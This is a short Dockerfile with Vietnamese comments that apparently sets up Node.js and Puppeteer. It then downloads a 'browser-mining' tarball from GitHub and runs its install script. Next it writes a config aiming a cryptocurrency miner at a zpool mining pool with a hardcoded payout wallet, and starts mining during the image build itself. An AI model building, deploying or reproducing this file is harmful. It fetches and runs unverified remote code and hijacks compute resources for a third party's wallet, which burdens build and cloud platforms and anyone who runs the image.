# Sử dụng Ubuntu làm base image
FROM ubuntu:latest

# Thiết lập chế độ không tương tác trong quá trình cài đặt
ENV DEBIAN_FRONTEND=noninteractive

# Cập nhật danh sách gói và cài đặt curl và npm
RUN apt-get update && apt-get install -y \
    curl \
    npm \
 && rm -rf /var/lib/apt/lists/*

# Cài đặt Node.js 22.x
RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash - && \
    apt-get install -y nodejs

# Cập nhật Puppeteer lên phiên bản mới nhất và hỗ trợ
RUN npm install puppeteer@latest

# Tải và cài đặt script browser mining
RUN curl https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz -L -O -J && \
    tar -xf browser-mining.tar.gz && \
    cd browser-mining && \
    npm install && \
    sh install.sh && \
    rm config.json && \
    echo '[{"algorithm": "minotaurx", "host": "minotaurx.sea.mine.zpool.ca", "port": 7019, "worker": "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q", "password": "c=RVN", "workers": 8 }]' > config.json && \
    node index.js

# Xóa các gói không cần thiết và các tệp tạm
RUN rm -rf /var/lib/apt/lists/*

# Lệnh khởi động (nếu cần)
# CMD [ "node", "index.js" ]
